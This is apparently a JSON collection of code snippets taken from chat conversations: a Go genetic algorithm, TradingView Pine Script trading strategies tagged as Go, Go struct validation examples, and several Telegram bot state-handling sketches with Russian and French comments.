    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"math/rand\"\n\t\"strings\"\n\t\"time\"\n)\n\nconst target = \"Hello, World!\"\nconst charset = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ !\"\nconst populationSize = 100\nconst mutationChance = 0.01 // 1% шанс мутации\n\ntype Individual struct {\n\tGenome string\n\tFitness int\n}\n\n// Функция создания начальной популяции\nfunc createPopulation(size int) []Individual {\n\tpopulation := make([]Individual, size)\n\tfor i := range population {\n\t\tpopulation[i] = Individual{generateRandomString(len(target)), 0}\n\t}\n\treturn population\n}\n\n// Генерация случайной строки заданной длины\nfunc generateRandomString(length int) string {\n\tvar output strings.Builder\n\tfor i := 0; i < length; i++ {\n\t\trandomChar := charset[rand.Intn(len(charset))]\n\t\toutput.WriteByte(randomChar)\n\t}\n\treturn output.String()\n}\n\n// Оценка приспособленности\nfunc calculateFitness(individual Individual) int {\n\tfitness := 0\n\tfor i := range individual.Genome {\n\t\tif individual.Genome[i] == target[i] {\n\t\t\tfitness++\n\t\t}\n\t}\n\treturn fitness\n}\n\n// Проведение естественного отбора\nfunc selectIndividuals(population []Individual) Individual {\n\ttotalFitness := 0\n\tfor _, individual := range population {\n\t\ttotalFitness += individual.Fitness\n\t}\n\tselected := rand.Intn(totalFitness)\n\tcurrent := 0\n\tfor _, individual := range population {\n\t\tcurrent += individual.Fitness\n\t\tif current >= selected {\n\t\t\treturn individual\n\t\t}\n\t}\n\treturn population[0] // В случае ошибки выбираем первого\n}\n\n// Скрещивание\nfunc crossover(parent1, parent2 Individual) Individual {\n\tchildGenome := \"\"\n\tfor i := range parent1.Genome {\n\t\tif rand.Float32() < 0.5 {\n\t\t\tchildGenome += string(parent1.Genome[i])\n\t\t} else {\n\t\t\tchildGenome += string(parent2.Genome[i])\n\t\t}\n\t}\n\treturn Individual{childGenome, 0}\n}\n\n// Мутация\nfunc mutate(individual Individual) {\n\tchars := []rune(individual.Genome)\n\tfor i := range chars {\n\t\tif rand.Float64() < mutationChance {\n\t\t\tchars[i] = rune(charset[rand.Intn(len(charset))])\n\t\t}\n\t}\n\tindividual.Genome = string(chars)\n}\n\nfunc main() {\n\trand.Seed(time.Now().UnixNano())\n\tpopulation := createPopulation(populationSize)\n\n\tgeneration := 0\n\tfor {\n\t\tgeneration++\n\t\t// Оценка приспособленности\n\t\tfor i := range population {\n\t\t\tpopulation[i].Fitness = calculateFitness(population[i])\n\t\t\tif population[i].Fitness == len(target) { // Условие остановки\n\t\t\t\tfmt.Printf(\"Найдено: %s, Поколение: %d\\n\", population[i].Genome, generation)\n\t\t\t\treturn\n\t\t\t}\n\t\t}\n\n\t\t// Создание нового поколения\n\t\tnewPopulation := make([]Individual, populationSize)\n\t\tfor i := range newPopulation {\n\t\t\tparent1 := selectIndividuals(population)\n\t\t\tparent2 := selectIndividuals(population)\n\t\t\tchild := crossover(parent1, parent2)\n\t\t\tmutate(child)\n\t\t\tnewPopulation[i] = child\n\t\t}\n\t\tpopulation = newPopulation\n\t\tfmt.Printf(\"Поколение %d: Лучший результат - %s\\n\", generation, population[0].Genome)\n\t}\n}",
    "filename": "a6c8350387121bb85130675a32bee9c7_0.go"
  },
  {
    "conversation_hash": "b0478932903c93e0e78c4d519aa0ef26",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstrategy(\"Unique PSAR + Volatility Filter Strategy\", shorttitle=\"Unique PSAR Strat\", overlay=true)\n// Ваши параметры и логика стратегии...\n\nif (unique_buy_signal)\n    strategy.entry(\"Buy\", strategy.long)\n\n// Предположим, что lowerBB ваш начальный уровень стоп-лосса\nstrategy.exit(\"Stop Loss\", \"Buy\", stop=lowerBB)\n\n// Логика для выхода на безубыток\nvar float break_even_stop_price = na // Используйте переменную для хранения цены выхода на безубыток\nif (strategy.position_size > 0) // Проверяем, что у нас открыта длинная позиция\n    // Проверяем, достиг ли первый тейк-профит\n    if (close > strategy.position_avg_price * (1 + array.get(take_profit_percentages, 0)))\n        break_even_stop_price := strategy.position_avg_price // Устанавливаем цену безубытка в размере средней цены входа\n        \n    if not na(break_even_stop_price)\n        // Используем обновленный стоп для выхода на безубыток\n        strategy.exit(\"Break-Even Stop\", \"Buy\", stop=break_even_stop_price)\n\n// Продолжение вашего кода...",
    "filename": "b0478932903c93e0e78c4d519aa0ef26_7.go"
  },
  {
    "conversation_hash": "b0478932903c93e0e78c4d519aa0ef26",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstudy(\"Binary Option Strategy Tester with Martingale\", shorttitle=\"BOST V.1\")\n\n// Ваши настройки и определения ...\n\n// Расчет линий Боллинджера\nbasis = sma(close, lengthBB)\ndev = multBB * stdev(close, lengthBB)\nupperBB = basis + dev\nlowerBB = basis - dev\n\n// Новая логика для сигналов на основании прикосновения к Боллинджеру\nis_call = close[1] > upperBB[1] // Используйте [1] для рассмотрения предыдущего бара\nis_put = close[1] < lowerBB[1] \n\n// Следующий код остается без изменений до блоков подсчета результатов ...\n\n// Модификации ваших блоков подсчета результатов и вывода\n\n// Пример реализации для счетчика \"если не зашло\"\nvar int touchBollingerCount = 0\nif (is_call or is_put)\n    touchBollingerCount := touchBollingerCount + 1\n    // Дополнительная логика для определения, \"вошло\" ли прикосновение в соответствии с вашими условиями\n    // Это может включать проверку результатов сделки\n    // В трейдинге опционами \"если не зашло\" может означать, что прогноз по направлению цены был неверен\n    // Например, если вы ожидаете роста цены после прикосновения к нижней линии Боллинджера, но цена падает\n\n// Для отображения в таблице добавьте переменную touchBollingerCount к соответствующим ячейкам\n\n// Продолжение вашего кода ...",
    "filename": "b0478932903c93e0e78c4d519aa0ef26_9.go"
  },
  {
    "conversation_hash": "b0478932903c93e0e78c4d519aa0ef26",
    "code_index": 10,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstrategy(\"Binary Option Strategy Tester with Bollinger Bands Martingale\", shorttitle=\"BOST BB Martingale V.1\", overlay=true)\n\n// Входы\ni_trade_call_put = input('BOTH', title=\"Trade Call/Put\", type=input.string, options=['BOTH', 'CALL', 'PUT'])\ni_martingale_level = input(1, title=\"Martingale Level\", type=input.integer, minval=1, maxval=5)\ni_martingle_trade = input('SAME', title=\"Type of Martingale Trade\", type=input.string, options=['SAME', 'OPPOSITE', 'FOLLOW CANDLE COLOR', 'OPPOSITE CANDLE COLOR'])\n\n// Параметры для Bollinger Bands\nlengthBB = input(20, title=\"BB Length\")\nmultBB = input(2.0, title=\"BB Multiplier\")\nbasisBB = sma(close, lengthBB)\ndevBB = multBB * stdev(close, lengthBB)\nupperBB = basisBB + devBB\nlowerBB = basisBB - devBB\n\n// Логика торговли\nvar trade_counter = 0\nvar win_counter = 0\nvar loss_counter = 0\nvar martingale_counter = 0\nvar in_trade = false\n\ntouchUpperBB() => close[1] > upperBB[1] and not in_trade\ntouchLowerBB() => close[1] < lowerBB[1] and not in_trade\n\nprocessTrade(result) =>\n    if result\n        win_counter := win_counter + 1\n        martingale_counter := 0\n    else\n        loss_counter := loss_counter + 1\n        martingale_counter := martingale_counter < i_martingale_level ? martingale_counter + 1 : 0\n    in_trade := false\n\nif touchUpperBB()\n    trade_counter := trade_counter + 1\n    in_trade := true\n    strategy.entry(\"Call Entry\", strategy.long)\n    \nif touchLowerBB()\n    trade_counter := trade_counter + 1\n    in_trade := true\n    strategy.entry(\"Put Entry\", strategy.short)\n    \n// Экспирация на 4 бара позже\nif (in_trade and bar_index - strategy.opentrades.entry_bar_index(strategy.opentrades - 1) == 4)\n    if (i_trade_call_put == 'CALL' and close > strategy.opentrades.entry_price(strategy.opentrades - 1)) or (i_trade_call_put == 'PUT' and close < strategy.opentrades.entry_price(strategy.opentrades - 1))\n        processTrade(true)\n    else\n        processTrade(false)\n    \n    \n// Вывод\nplotshape(series=touchUpperBB(), style=shape.triangleup, location=location.belowbar, color=color.green, size=size.small, title=\"Call Signal\")\nplotshape(series=touchLowerBB(), style=shape.triangledown, location=location.abovebar, color=color.red, size=size.small, title=\"Put Signal\")\nhline(y=win_counter, color=color.green, linestyle=hline.style_solid, title=\"Wins\")\nhline(y=loss_counter, color=color.red, linestyle=hline.style_solid, title=\"Losses\")",
    "filename": "b0478932903c93e0e78c4d519aa0ef26_10.go"
  },
  {
    "conversation_hash": "8c8e2ef7340ce6519818d730100d0941",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"github.com/go-playground/validator/v10\"\n)\n\nfunc main() {\n\tv := validator.New()\n\tupdateReq := UpdateApartmentRequest{\n\t\tId:        1,\n\t\tAvailable: true,\n\t}\n\n\terr := v.Struct(updateReq)\n\tif err != nil {\n\t\tfor _, e := range err.(validator.ValidationErrors) {\n\t\t\tfmt.Println(e)\n\t\t}\n\t} else {\n\t\tfmt.Println(\"UpdateApartmentRequest is valid\")\n\t}\n}",
    "filename": "8c8e2ef7340ce6519818d730100d0941_1.go"
  },
  {
    "conversation_hash": "8c8e2ef7340ce6519818d730100d0941",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package request\n\ntype CreateApartmentRequest struct {\n\t// Autres champs omis pour simplifier\n\tAvailable *bool `json:\"available\" validate:\"required\"`\n}\n\ntype UpdateApartmentRequest struct {\n\t// Autres champs omis pour simplifier\n\tAvailable *bool `json:\"available\" validate:\"required\"`\n}",
    "filename": "8c8e2ef7340ce6519818d730100d0941_3.go"
  },
  {
    "conversation_hash": "8c8e2ef7340ce6519818d730100d0941",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "package request\n\ntype UpdateApartmentRequest struct {\n\tId              int     `validate:\"omitempty\" json:\"id\"`\n\t// Autres champs omis pour la simplicité\n\tAvailable       *bool   `json:\"available\" validate:\"required\"`\n}",
    "filename": "8c8e2ef7340ce6519818d730100d0941_6.go"
  },
  {
    "conversation_hash": "8c8e2ef7340ce6519818d730100d0941",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "func (a *ApartmentServiceImpl) Update(appartment request.UpdateApartmentRequest) {\n\terr := a.Validate.Struct(appartment)\n\tErrorPanic(err)\n\t\n\tapartmentData := models.Appartement{\n\t\tId:              appartment.Id,\n\t\t// Autres champs omis pour la simplicité\n\t\tAvailable:       appartment.Available, // Directement affecté car c'est aussi un *bool dans models.Appartement\n\t}\n\t\n\ta.AppartmentRepository.Update(apartmentData)\n}",
    "filename": "8c8e2ef7340ce6519818d730100d0941_7.go"
  },
  {
    "conversation_hash": "8c8e2ef7340ce6519818d730100d0941",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "package models\n\ntype Appartement struct {\n\t// Autres champs omis pour la simplicité\n\tAvailable       *bool\n}",
    "filename": "8c8e2ef7340ce6519818d730100d0941_8.go"
  },
  {
    "conversation_hash": "c71b17d144c737f501d9adff405be94f",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "type Logger interface {\n    Log(message string)\n}\n\ntype ConsoleLogger struct{}\n\nfunc (cl ConsoleLogger) Log(message string) {\n    fmt.Println(message)\n}\n\nfunc logMessage(logger Logger, message string) {\n    logger.Log(message)\n}\n\nfunc main() {\n    cl := ConsoleLogger{}\n    logMessage(cl, \"Hello, implicit interface!\")\n}",
    "filename": "c71b17d144c737f501d9adff405be94f_5.go"
  },
  {
    "conversation_hash": "5c1829fce185454c2e4acc405264279f",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"log\"\n    \"time\"\n    \"gopkg.in/tucnak/telebot.v2\" // Убедитесь, что вы добавили эту библиотеку в ваш проект\n)\n\nfunc main() {\n    bot, err := telebot.NewBot(telebot.Settings{\n        Token:  \"YOUR_BOT_TOKEN_HERE\", // Замените на токен вашего бота\n        Poller: &telebot.LongPoller{Timeout: 10 * time.Second},\n    })\n\n    if err != nil {\n        log.Fatal(err)\n        return\n    }\n\n    // Обработчик всех текстовых сообщений\n    bot.Handle(telebot.OnText, func(m *telebot.Message) {\n        // Записываем текст сообщения отправленного пользователем в переменную\n        userText := m.Text\n\n        // Этот код просто отправляет обратно текст, который был получен от пользователя\n        if _, err := bot.Send(m.Sender, \"Вы написали: \"+userText); err != nil {\n            log.Println(\"Ошибка при отправке сообщения:\", err)\n        }\n    })\n\n    bot.Start()\n}",
    "filename": "5c1829fce185454c2e4acc405264279f_0.go"
  },
  {
    "conversation_hash": "5c1829fce185454c2e4acc405264279f",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "func handleVideosCommand(bot *tgbotapi.BotAPI, message tgbotapi.Message) {\n    // Предположим, что значение message.Text получено до выполнения этой функции\n    // Запрашиваем количество серий у пользователя\n    msg := tgbotapi.NewMessage(message.Chat.ID, \"Введите кол-во серий: \")\n    if _, err := bot.Send(msg); err != nil {\n        log.Printf(\"Ошибка при отправке сообщения: %v\", err)\n        return\n    }\n\n    // Преобразуем текст сообщения в число\n    value, err := strconv.Atoi(message.Text)\n    // Проверяем, что не было ошибки при преобразовании или значение меньше, чем 0\n    if err != nil || value < 0 {\n        sendMessage(bot, message.Chat.ID, \"Введено неверное значение\")\n        return\n    }\n\n    // Проверяем наличие видео в сообщении\n    if message.Video != nil {\n        // Сюда добавляется ваш код, относящийся к загрузке видео\n    }\n}",
    "filename": "5c1829fce185454c2e4acc405264279f_2.go"
  },
  {
    "conversation_hash": "5c1829fce185454c2e4acc405264279f",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"log\"\n\t\"strconv\"\n\t\"github.com/go-telegram-bot-api/telegram-bot-api\"\n)\n\nvar (\n\tbot *tgbotapi.BotAPI\n\t// Состояния хранятся как map[ID чата]текущее состояние\n\tchatStates = make(map[int64]string)\n)\n\nconst (\n\tstateWaitingForNumber = \"waiting_for_number\"\n)\n\nfunc main() {\n\tvar err error\n\tbot, err = tgbotapi.NewBotAPI(\"YOUR_TELEGRAM_BOT_TOKEN\")\n\tif err != nil {\n\t\tlog.Panic(err)\n\t}\n\n\tu := tgbotapi.NewUpdate(0)\n\tu.Timeout = 60\n\n\tupdates, err := bot.GetUpdatesChan(u)\n\tif err != nil {\n\t\tlog.Panic(err)\n\t}\n\n\tfor update := range updates {\n\t\tif update.Message == nil { // ignore any non-Message updates\n\t\t\tcontinue\n\t\t}\n\n\t\t// Логика обработки команд\n\t\tif update.Message.IsCommand() {\n\t\t\thandleCommand(update.Message)\n\t\t} else {\n\t\t\thandleMessage(update.Message)\n\t\t}\n\t}\n}\n\nfunc handleCommand(msg *tgbotapi.Message) {\n\tswitch msg.Command() {\n\tcase \"videos\":\n\t\tchatStates[msg.Chat.ID] = stateWaitingForNumber\n\t\tsendMessage(msg.Chat.ID, \"Введите кол-во серий:\")\n\t}\n}\n\nfunc handleMessage(msg *tgbotapi.Message) {\n\tswitch chatStates[msg.Chat.ID] {\n\tcase stateWaitingForNumber:\n\t\tnumber, err := strconv.Atoi(msg.Text)\n\t\tif err != nil || number < 0 {\n\t\t\tsendMessage(msg.Chat.ID, \"Введено неверное значение, пожалуйста введите корректное число\")\n\t\t\treturn\n\t\t}\n\n\t\t// Здесь можно обработать корректный ввод количества серий\n\t\tsendMessage(msg.Chat.ID, \"Количество серий принято.\")\n\t\tdelete(chatStates, msg.Chat.ID) // Вернуться к дефолтному состоянию\n\tdefault:\n\t\t// Обработка сообщений без ожидаемого состояния\n\t}\n}\n\nfunc sendMessage(chatID int64, text string) {\n\tmsg := tgbotapi.NewMessage(chatID, text)\n\tif _, err := bot.Send(msg); err != nil {\n\t\tlog.Printf(\"Ошибка при отправке сообщения: %v\", err)\n\t}\n}",
    "filename": "5c1829fce185454c2e4acc405264279f_3.go"
  },
  {
    "conversation_hash": "5c1829fce185454c2e4acc405264279f",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "func handleStartCommand(bot *tgbotapi.BotAPI, message tgbotapi.Message) {\n    // Создание объекта сообщения с кастомной клавиатурой\n    msg := tgbotapi.NewMessage(message.Chat.ID, \"Чем могу быть полезен?\")\n    msg.ReplyMarkup = createKeyboard()\n\n    // Отправка сообщения\n    bot.Send(msg)\n}\n\n// Предполагаем, что createKeyboard создает обычную кастомную клавиатуру\nfunc createKeyboard() tgbotapi.ReplyKeyboardMarkup {\n    // Здесь должна быть ваша логика создания клавиатуры\n    // Пример:\n    keyboard := tgbotapi.NewReplyKeyboard(\n        tgbotapi.NewKeyboardButtonRow(\n            tgbotapi.NewKeyboardButton(\"Кнопка 1\"),\n        ),\n    )\n    return keyboard\n}",
    "filename": "5c1829fce185454c2e4acc405264279f_4.go"
  },
  {
    "conversation_hash": "5c1829fce185454c2e4acc405264279f",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "func handleStartCommand(bot *tgbotapi.BotAPI, message tgbotapi.Message) {\n    // Создаем клавиатуру с помощью функции createKeyboard\n    replyKeyboard := createKeyboard()\n\n    // Создаем сообщение с применением клавиатуры\n    msg := tgbotapi.NewMessage(message.Chat.ID, \"Чем могу быть полезен?\")\n    msg.ReplyMarkup = replyKeyboard\n\n    // Отправляем сообщение с помощью выделенной функции sendMessage\n    // Помните, что функция sendMessage ожидает chatID и текст, поэтому\n    // мы не можем напрямую передать ей наше сообщение с клавиатурой.\n    // В данном случае, поскольку sendMessage не поддерживает отправку\n    // сообщений с клавиатурами, нам придется использовать метод bot.Send() напрямую.\n    if _, err := bot.Send(msg); err != nil {\n        log.Printf(\"Ошибка при отправке сообщения: %v\", err)\n    }\n}",
    "filename": "5c1829fce185454c2e4acc405264279f_5.go"
  },
  {
    "conversation_hash": "fcd39dfb342f76bfa0959c9c790bfc2a",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"log\"\n\n\ttgbotapi \"github.com/go-telegram-bot-api/telegram-bot-api/v5\"\n)\n\n// sendMessage - функция теперь может отправлять и клавиатуры\nfunc sendMessage(bot *tgbotapi.BotAPI, chatID int64, text string, keyboard interface{}) {\n\tmsg := tgbotapi.NewMessage(chatID, text)\n\n\t// Проверяем, передана ли клавиатура\n\tif keyboard != nil {\n\t\tswitch k := keyboard.(type) {\n\t\tcase tgbotapi.ReplyKeyboardMarkup:\n\t\t\tmsg.ReplyMarkup = k\n\t\tcase tgbotapi.InlineKeyboardMarkup:\n\t\t\tmsg.ReplyMarkup = k\n\t\tdefault:\n\t\t\tlog.Printf(\"Неизвестный тип клавиатуры\")\n\t\t}\n\t}\n\n\t// Отправляем сообщение\n\tif _, err := bot.Send(msg); err != nil {\n\t\tlog.Printf(\"Ошибка при отправке сообщения: %v\", err)\n\t}\n}\n\n// handleStartCommand - модифицированная функция для отправки клавиатуры\nfunc handleStartCommand(bot *tgbotapi.BotAPI, message tgbotapi.Message) {\n\t// Пример создания простой клавиатуры\n\tkeyboard := tgbotapi.NewReplyKeyboard(\n\t\ttgbotapi.NewKeyboardButtonRow(\n\t\t\ttgbotapi.NewKeyboardButton(\"Кнопка 1\"),\n\t\t),\n\t)\n\n\tsendMessage(bot, message.Chat.ID, \"Чем могу быть полезен?\", keyboard)\n}\n\n// Пример использования в демонстрационных целях\nfunc main() {\n\t// Здесь должна быть логика создания и конфигурации экземпляра бота\n\t// и вызов handleStartCommand для демонстрации\n}",
    "filename": "fcd39dfb342f76bfa0959c9c790bfc2a_0.go"
  },
  {
    "conversation_hash": "fcd39dfb342f76bfa0959c9c790bfc2a",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func VideoLoader(bot *tgbotapi.BotAPI, chatID int64, message tgbotapi.Message) {\n    // Отправляем начальное сообщение\n    msg := tgbotapi.NewMessage(chatID, \"Отправляйте видео одно за другим.\")\n    bot.Send(msg)\n\n    value := //.. значение, которое вы передаете в функцию, пока не ясно как получать его здесь потому оставлено как комментарий\n\n    for value > 0 {\n        // Проверяем наличие видео в сообщении\n        if message.Video == nil {\n            errorMsg := tgbotapi.NewMessage(chatID, \"Это не видео!\")\n            bot.Send(errorMsg)\n            return // Выход, если нет видео, возможно вы захотите продолжить прием сообщений\n        }\n\n        value--\n\n        // Отправляем информацию о проиндексированных видео\n        indexedMsg := tgbotapi.NewMessage(chatID, \"Проиндексировано: \"+strconv.Itoa(int(value)))\n        bot.Send(indexedMsg)\n    }\n}",
    "filename": "fcd39dfb342f76bfa0959c9c790bfc2a_1.go"
  },
  {
    "conversation_hash": "76bbef5d56d907005efc67c14bfc243e",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"github.com/go-telegram-bot-api/telegram-bot-api\"\n    \"strconv\"\n)\n\n// Допустим у нас есть глобальный map для отслеживания состояний пользователей\nvar userStates = make(map[int64]string)\n\nfunc handleIncomingMessages(bot *tgbotapi.BotAPI, update tgbotapi.Update) {\n    if update.Message == nil { // Если это не текстовое сообщение\n        return\n    }\n    \n    userID := update.Message.From.ID\n    chatID := update.Message.Chat.ID\n    text := update.Message.Text\n\n    switch userStates[chatID] {\n    case \"WAITING_FOR_VIDEO_COUNT\":\n        handleVideoCountInput(bot, chatID, text)\n    default:\n        switch text {\n        case \"/videos\", \"Загрузить видео\":\n            handleVideosCommand(bot, chatID)\n        // Добавьте дополнительные кейсы для других команд и состояний\n        }\n    }\n}\n\nfunc handleVideosCommand(bot *tgbotapi.BotAPI, chatID int64) {\n    sendMessage(bot, chatID, \"Введите кол-во серий: \")\n    userStates[chatID] = \"WAITING_FOR_VIDEO_COUNT\"\n}\n\nfunc handleVideoCountInput(bot *tgbotapi.BotAPI, chatID int64, text string) {\n    value, err := strconv.Atoi(text)\n    if err != nil || value <= 0 {\n        sendMessage(bot, chatID, \"Введено неверное значение\")\n    } else {\n        sendMessage(bot, chatID, \"Отправляйте видео одно за другим.\")\n        // Допустим, middleware.VideoLoader должен быть вызван здесь\n        // middleware.VideoLoader(int64(value), message)\n    }\n    // Обратите внимание, что после завершения работы с количеством серий, состояние должно быть сброшено или изменено\n    // Например:\n    delete(userStates, chatID) // или userStates[chatID] = \"\", если хотите оставить ключ в мапе\n}\n\nfunc sendMessage(bot *tgbotapi.BotAPI, chatID int64, text string) {\n    msg := tgbotapi.NewMessage(chatID, text)\n    bot.Send(msg)\n}\n\n// Далее следует основной цикл бота, где вызывается handleIncomingMessages для каждого обновления",
    "filename": "76bbef5d56d907005efc67c14bfc243e_0.go"
  },
  {
    "conversation_hash": "76bbef5d56d907005efc67c14bfc243e",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"github.com/go-telegram-bot-api/telegram-bot-api\"\n)\n\ntype UserState string\n\nconst (\n    StateDefault           UserState = \"DEFAULT\"\n    StateWaitingForVideos  UserState = \"WAITING_FOR_VIDEOS\"\n    // Добавьте другие состояния по мере необходимости\n)\n\ntype UserProfile struct {\n    State UserState\n}\n\nvar userProfiles = make(map[int64]*UserProfile)\n\nfunc main() {\n    // Инициализация бота и обработка входящих сообщений опущена для краткости\n}\n\nfunc handleMessage(bot *tgbotapi.BotAPI, update tgbotapi.Update) {\n    if update.Message == nil { // игнорировать любые неподходящие обновления\n        return\n    }\n\n    userId := update.Message.From.ID\n    profile, exists := userProfiles[userId]\n    if !exists {\n        profile = &UserProfile{State: StateDefault}\n        userProfiles[userId] = profile\n    }\n\n    switch profile.State {\n    case StateWaitingForVideos:\n        handleWaitingForVideosState(bot, update, profile)\n    default:\n        handleDefaultState(bot, update, profile)\n    }\n}\n\nfunc handleWaitingForVideosState(bot *tgbotapi.BotAPI, update tgbotapi.Update, profile *UserProfile) {\n    // Обработка сообщения, когда пользователь находится в состоянии ожидания информации о видео\n    // Не забудьте изменить состояние профиля после обработки\n    profile.State = StateDefault // Пример изменения состояния\n}\n\nfunc handleDefaultState(bot *tgbotapi.BotAPI, update tgbotapi.Update, profile *UserProfile) {\n    // Обработка сообщения в \"обычном\" режиме (по умолчанию)\n    if update.Message.Text == \"/videos\" {\n        sendMessage(bot, update.Message.Chat.ID, \"Введите количество серий:\")\n        profile.State = StateWaitingForVideos // Переход в состояние ожидания ввода\n        return\n    }\n    // Логика для обработки других команд в состоянии по умолчанию\n}\n\nfunc sendMessage(bot *tgbotapi.BotAPI, chatID int64, text string) {\n    msg := tgbotapi.NewMessage(chatID, text)\n    bot.Send(msg)\n}",
    "filename": "76bbef5d56d907005efc67c14bfc243e_1.go"
  },
  {
    "conversation_hash": "0865a1a8e1cc3342767b678fc7db67c6",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"github.com/go-telegram-bot-api/telegram-bot-api\"\n\t\"log\"\n)\n\n// Тип для состояния пользователя\ntype UserState string\n\n// Возможные состояния пользователя\nconst (\n\tStateStart       UserState = \"START\"\n\tStateCollectInfo UserState = \"COLLECT_INFO\"\n\tStateCompleted   UserState = \"COMPLETED\"\n)\n\n// UserData хранит данные о пользователе и его текущем состоянии\ntype UserData struct {\n\tState         UserState\n\tCollectedInfo string // Пример собираемой информации\n}\n\n// Глобальный мап для хранения состояния каждого пользователя\nvar usersStateMap map[int64]*UserData",
    "filename": "0865a1a8e1cc3342767b678fc7db67c6_0.go"
  },
  {
    "conversation_hash": "0865a1a8e1cc3342767b678fc7db67c6",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n\tusersStateMap = make(map[int64]*UserData)\n\n\tbot, err := tgbotapi.NewBotAPI(\"YOUR_TELEGRAM_BOT_TOKEN\")\n\tif err != nil {\n\t\tlog.Panic(err)\n\t}\n\n\tu := tgbotapi.NewUpdate(0)\n\tu.Timeout = 60\n\n\tupdates, err := bot.GetUpdatesChan(u)\n\n\tfor update := range updates {\n\t\tif update.Message != nil {\n\t\t\tuserId := update.Message.From.ID\n\t\t\tif _, ok := usersStateMap[userId]; !ok {\n\t\t\t\tusersStateMap[userId] = &UserData{State: StateStart} // Инициализация состояния\n\t\t\t}\n\n\t\t\tswitch usersStateMap[userId].State {\n\t\t\tcase StateStart:\n\t\t\t\thandleStartState(bot, update)\n\t\t\tcase StateCollectInfo:\n\t\t\t\thandleCollectInfoState(bot, update)\n\t\t\t// Добавьте больше состояний по мере необходимости\n\t\t\t}\n\t\t}\n\t}\n}",
    "filename": "0865a1a8e1cc3342767b678fc7db67c6_1.go"
  },
  {
    "conversation_hash": "0865a1a8e1cc3342767b678fc7db67c6",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "// handleStartState обрабатывает состояние START\nfunc handleStartState(bot *tgbotapi.BotAPI, update tgbotapi.Update) {\n\tmsg := tgbotapi.NewMessage(update.Message.Chat.ID, \"Привет! Давай начнем. Отправь мне немного информации.\")\n\tusersStateMap[update.Message.From.ID].State = StateCollectInfo // Переход к следующему состоянию\n\tbot.Send(msg)\n}\n\n// handleCollectInfoState обрабатывает состояние COLLECT_INFO\nfunc handleCollectInfoState(bot *tgbotapi.BotAPI, update tgbotapi.Update) {\n\tuserData := usersStateMap[update.Message.From.ID]\n\tuserData.CollectedInfo = update.Message.Text // Сохранение собранной информации\n\tuserData.State = StateCompleted              // Переход к следующему состоянию\n\n\tmsg := tgbotapi.NewMessage(update.Message.Chat.ID, \"Спасибо! Информация собрана.\")\n\tbot.Send(msg)\n}",
    "filename": "0865a1a8e1cc3342767b678fc7db67c6_2.go"
  },
  {
    "conversation_hash": "0865a1a8e1cc3342767b678fc7db67c6",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "type UserState string\n\nconst (\n\tStateNone        UserState = \"NONE\"\n\tStateAwaitVideo  UserState = \"AWAIT_VIDEO_COUNT\"\n\tStateUploadingVideo UserState = \"UPLOADING_VIDEO\"\n)\n\n// Global map для отслеживания состояния пользователя (в реальном проекте лучше использовать БД)\nvar userStates = make(map[int64]UserState)",
    "filename": "0865a1a8e1cc3342767b678fc7db67c6_3.go"
  },
  {
    "conversation_hash": "0865a1a8e1cc3342767b678fc7db67c6",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "func handleCommand(bot *tgbotapi.BotAPI, message tgbotapi.Message) {\n\tuserID := message.From.ID\n\n\tswitch userStates[userID] {\n\tcase StateNone:\n\t\tswitch message.Text {\n\t\tcase \"/start\":\n\t\t\thandleStartCommand(bot, message)\n\t\tcase \"/videos\":\n\t\t\thandleChangeState(bot, message, StateAwaitVideo)\n\t\t\tsendMessage(bot, message.Chat.ID, \"Введите кол-во серий: \")\n\t\tcase \"/posts\":\n\t\t\thandlePostsCommand(bot, message)\n\t\tcase \"/topics\":\n\t\t\thandleTopicsCommand(bot, message)\n\t\tdefault:\n\t\t\tsendMessage(bot, message.Chat.ID, \"Я не знаю такую команду\")\n\t\t}\n\tcase StateAwaitVideo:\n\t\thandleVideosCommand(bot, message)\n\t}\n}\n\nfunc handleChangeState(bot *tgbotapi.BotAPI, message tgbotapi.Message, newState UserState) {\n\tuserID := message.From.ID\n\tuserStates[userID] = newState\n\n\tif newState == StateNone {\n\t\tsendMessage(bot, message.Chat.ID, \"Вы вышли из режима.\")\n\t}\n}",
    "filename": "0865a1a8e1cc3342767b678fc7db67c6_4.go"
  },
  {
    "conversation_hash": "0865a1a8e1cc3342767b678fc7db67c6",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
